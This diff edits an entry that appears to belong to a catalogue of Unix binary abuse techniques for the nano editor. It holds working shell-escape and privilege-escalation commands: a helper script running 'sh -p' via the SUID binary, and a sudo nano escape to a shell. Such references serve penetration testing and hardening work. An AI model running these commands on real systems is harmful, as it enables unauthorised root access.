@@ -7,10 +7,8 @@ functions:
         reset; sh 1>&0 2>&0
     - description: The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
       code: |
-        TF=$(mktemp)
-        echo 'exec sh' > $TF
-        chmod +x $TF
-        nano -s $TF /etc/hosts
+        nano -s /bin/sh
+        /bin/sh
         ^T
   file-write:
     - code: |
@@ -23,7 +21,8 @@ functions:
     - description: The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
       code: |
         TF=$(mktemp)
-        echo 'exec sh -p' > $TF
+        echo '#!/bin/sh -p
+        exec sh -p' > $TF
         chmod +x $TF
         ./nano -s $TF /etc/hosts
         ^T
@@ -32,11 +31,4 @@ functions:
         sudo nano
         ^R^X
         reset; sh 1>&0 2>&0
-    - description: The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
-      code: |
-        TF=$(mktemp)
-        echo 'exec sh' > $TF
-        chmod +x $TF
-        sudo nano -s $TF /etc/hosts
-        ^T
 ---
